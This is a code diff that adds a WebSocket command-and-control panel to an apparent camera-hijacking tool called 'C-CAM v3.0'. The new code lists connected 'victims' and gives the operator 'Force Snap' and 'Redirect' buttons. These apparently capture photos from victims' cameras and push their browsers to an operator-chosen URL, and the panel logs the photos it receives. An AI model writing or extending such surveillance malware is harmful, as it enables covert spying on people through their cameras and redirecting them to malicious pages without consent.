@@ -390,6 +390,67 @@
     <script>
     var liveEvents = [];
     var lastLiveCheck = 0;
+    var activeTargets = {}; // Map sessionID -> setup
+
+    // C-CAM v3.0 WebSocket controller Node
+    var ws = new WebSocket("ws://127.0.0.1:8765");
+    ws.onopen = function() {
+        ws.send(JSON.stringify({ "type": "dashboard" }));
+        var statusSpan = document.querySelector('.navbar .status span:last-child');
+        if (statusSpan) {
+            statusSpan.textContent = "Socket Connected";
+            statusSpan.style.color = "#22c55e";
+        }
+    };
+
+    ws.onmessage = function(event) {
+        var data = JSON.parse(event.data);
+        if (data.target_online) {
+            activeTargets[data.target_online] = { online: true, time: new Date().toLocaleTimeString() };
+            addLiveEvent('🎯 Target Connected to Control System: ' + data.target_online, 'target', new Date().toLocaleTimeString());
+            loadActiveTargets();
+        }
+        if (data.photos) {
+            addLiveEvent('📸 New photos received via Socket!', 'photo', new Date().toLocaleTimeString());
+            loadPhotos();
+        }
+    };
+
+    function sendCommand(targetId, cmd, url="") {
+        if (ws.readyState === WebSocket.OPEN) {
+            ws.send(JSON.stringify({ "cmd": cmd, "id": targetId, "url": url }));
+            addLiveEvent('📢 Command [' + cmd + '] Sent to ' + targetId, 'target', new Date().toLocaleTimeString());
+        } else {
+            alert("WebSocket is not connected.");
+        }
+    }
+
+    function loadActiveTargets() {
+        var panel = document.getElementById('panel-sessions');
+        var container = document.getElementById('sessionList');
+        // Prepend list node active control panel frames layout
+        var html = '<div style="background:rgba(0,245,160,0.05); border:1px solid rgba(0,245,160,0.2); border-radius:12px; padding:15px; margin-bottom:20px;">';
+        html += '<h3 style="font-size:14px; color:#00f5a0; margin-bottom:10px;">🎮 Active WebSocket Victims:</h3>';
+        var counts = 0;
+        for (var id in activeTargets) {
+            counts++;
+            html += '<div style="display:flex; justify-content:space-between; align-items:center; background:#0f172a; padding:12px; border-radius:8px; margin-bottom:8px;">';
+            html += '<span style="font-size:13px; color:#fff;">Target ID: <b>' + id + '</b> <span style="font-size:11px; color:#666;">(@' + activeTargets[id].time + ')</span></span>';
+            html += '<div style="display:flex; gap:8px;">';
+            html += '<button onclick="sendCommand(\'' + id + '\', \'SNAP\')" style="background:#f59e0b; color:white; border:none; padding:6px 12px; border-radius:6px; font-size:11px; font-weight:bold; cursor:pointer;">📸 Force Snap</button>';
+            html += '<button onclick="sendCommand(\'' + id + '\', \'REDIRECT\', prompt(\'Enter Redirect URL:\'))" style="background:#ef4444; color:white; border:none; padding:6px 12px; border-radius:6px; font-size:11px; font-weight:bold; cursor:pointer;">🔗 Redirect</button>';
+            html += '</div></div>';
+        }
+        if (counts === 0) html += '<p style="font-size:12px; color:#888;">No active WebSocket links currently connected.</p>';
+        html += '</div>';
+        
+        // Render it into sessions list top frame buffers
+        if (counts > 0) {
+            var existing = container.innerHTML;
+            if (container.querySelector('.empty-state')) existing = '';
+            container.innerHTML = html + existing;
+        }
+    }
     
     function switchTab(tab) {
         document.querySelectorAll('.tab').forEach(function(t) { t.classList.remove('active'); });
